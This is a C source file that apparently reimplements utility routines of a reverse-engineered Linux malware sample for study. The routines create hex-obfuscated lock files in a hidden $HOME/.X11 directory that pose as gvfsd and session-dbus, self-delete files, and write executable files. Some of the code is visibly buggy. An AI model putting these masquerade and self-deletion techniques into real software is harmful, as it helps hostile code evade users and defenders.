#include "utils.h"

#include <linux/limits.h>
#include <stdbool.h>
#include <stdlib.h>
#include <strings.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>

/**
 * Create a lock file to ensure one instance is running.
 * TODO - but how does this apply to the watch dog instances?
 * @param N/A
 * @return void
 * */
void create_lock(int lock_id) {

    char *HOME = getenv("HOME");

    // lock file params taken from Netlab 360 report
    static struct flock lock;
    lock.l_type = F_WRLCK;
    lock.l_whence = 0;
    lock.l_len = 1LL;

    // create .X11 dir if it does not exist, required for both lock paths.
    char *x11dir= "/.X11";
    char *dirpath = (char *)malloc(PATH_MAX);
    memset(dirpath, 0, PATH_MAX);
    strncat(dirpath, HOME, strlen(HOME));
    strncat(dirpath, x11dir, strlen(x11dir));
    if (access(dirpath, F_OK) == -1) {
        mkdir(dirpath, 0755);
    }


    if (lock_id == 0) {
        // if lock id == 0 then do ....
        // gvfsd lock file
        //$HOME/.X11/X0-lock
        char x11_lock_file [14] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x58,0x30,0x2d,0x6c,0x6f,0x63,0x6b};

        // $HOME/.X11/x0-lock
        int fpath_size = strlen(HOME) + strlen(x11_lock_file);
        char *flock_path = (char *)malloc(PATH_MAX);
        memset(flock_path, 0, PATH_MAX);
        strncat(flock_path, HOME, strlen(HOME));
        strncat(flock_path, x11_lock_file, strlen(x11_lock_file));


        // create directory of .X11 if it does not exist
        // TODO - what perms?
        int fd = open(flock_path, O_CREAT);
        if (fd != -1) {
            // placing advisory lock on file
            fcntl(fd, F_SETLK, &lock);
        }

        free(flock_path);
        close(fd);
    } else if (lock_id == 1) {

        // if lock id == 1 then do...
        // session dbus lock file
        //$HOME/.X11/.X11-lock
        char x11_lock_file_2 [16] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x2e,0x78,0x31,0x31,0x2d,0x6c,0x6f,0x63,0x6b};

        int fpath_size_2 = strlen(HOME) + strlen(x11_lock_file_2);
        char *flock_path_2 = (char *)malloc(PATH_MAX);
        memset(flock_path_2, 0, PATH_MAX);
        strncat(flock_path_2, HOME, strlen(HOME));
        strncat(flock_path_2, x11_lock_file_2, strlen(x11_lock_file_2));


        // create directory of .X11 if it does not exist
        // TODO - what perms?
        int fd = open(flock_path_2, O_CREAT);
        if (fd != -1) {
            // placing advisory lock on file
            fcntl(fd, F_SETLK, &lock);
        }

        free(flock_path_2);
        close(fd);
    }

    free(dirpath);
}


/**
 * @brief check if a given lock file is currently in use to identify which process to spawn.
 * @param char pointer to file path to check if lock file is present
 * @return integer value indicating which file is locked
 * */
int lock_check(char *fpath) {

    // gain file handle to fpath
    int fd = open(fpath, 66, 0666);
    static struct flock lock;

    lock.l_type = F_WRLCK;
    lock.l_whence = 0;
    lock.l_len = 1LL;

    // attempt to lock...
    int f_res = fcntl(fd, F_SETLK, &lock);

    // file is locked, return 1;
    if (f_res == -1) {
        return 1;
    }

    // file is not locked, return 0;
    return 0;
}


/**
 * @brief delete file based on fpath
 * @param file path to delete
 * @return boolean value indicating success/failure
 **/
bool self_delete(char *fpath) {

    int res = unlink(fpath);
    if (res < 0){
        #ifdef DEBUG
        fprintf(stderr, "[utils/self_delete] Error: %s\n", strerror(errno));
        #endif
        return false;
    }
    return true;
}


/**
 * obtain PID from shared mem instance
 *
 * @param size: size of data to copy into buffer
 * @param fpath file path to read in
 *
 * @return pointer to char buffer
 * */

char *copy_pid_from_shared_mem(uint size, char *fpath) {

    // the structure was copied from reverse engineering
    // function at offset 0x0040736f in sample 5c0f375e92f551e8f2321b141c15c48f
    char *tmpFileBuff = (char *)malloc(0x40);
    bzero(tmpFileBuff, 0x40);
    sprintf(tmpFileBuff, fpath, size);

    char *filePathBuff= (char *)malloc(0x1000);
    bzero(filePathBuff, 0x1000);
    int bytesRead = readlink(tmpFileBuff, filePathBuff, 0xfff);

    // if we didn't read all of the bytes something terrible has happened.
    if (bytesRead != size) {
        free(tmpFileBuff);
        free(filePathBuff);
        return NULL;
    }

    free(tmpFileBuff);
    return filePathBuff;
}



/**
 * Write data to a given fpath
 *
 * @param size: size of data to copy into buffer
 * @param fpath file path to read in
 *
 * @return integer value
 * */
bool write_to_file(char *fpath, char *data) {

    // TODO - double check file permissions
    int fd = open(fpath, O_CREAT | O_WRONLY, S_IRUSR|S_IEXEC);
    int numbyteswritten = write(fd, data, strlen(data));

    close(fd);
    if (numbyteswritten == strlen(data)) {
        return true;
    } else {
        return false;
    }

    return false;
}


bool get_pwd() {

    char *cwd = (char *)malloc(256);
    memset(cwd, 0, 256);
    getcwd(cwd, 256);

    // 47 == hex for "/"
    char *basename = strrchr(cwd, 47);

    // session-dbus
    if (strncmp("/sessions", basename, strlen("sessions")) == 0) {
        return false;
    // gvfsd
    } else if (strncmp("/.profile", basename, strlen("/.profile")) == 0) {
        return true;
    } else {
        return true;
    }
}

/*
void _mkdir(bool home, char *fpath, int mode) {

    char tmpPath[PATH_MAX];
    char *path = NULL;
    int len;
}
*/
